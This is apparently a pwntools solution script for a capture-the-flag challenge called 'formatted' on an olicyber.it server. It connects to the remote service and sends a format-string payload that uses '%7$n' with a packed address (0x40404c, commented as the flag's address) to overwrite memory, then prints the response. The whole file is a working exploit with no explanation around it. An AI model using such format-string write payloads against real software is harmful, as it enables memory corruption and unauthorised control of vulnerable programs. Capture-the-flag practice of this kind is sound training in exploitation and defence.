#!/usr/bin/env python3
from pwn import *
# address of flag = 0x40404c
addr = p64(0x40404c)
r = remote("formatted.challs.olicyber.it", 10305)
r.sendlineafter(b"?\n", b" %7$n   "+p64(0x40404c))
print(r.recv(100))
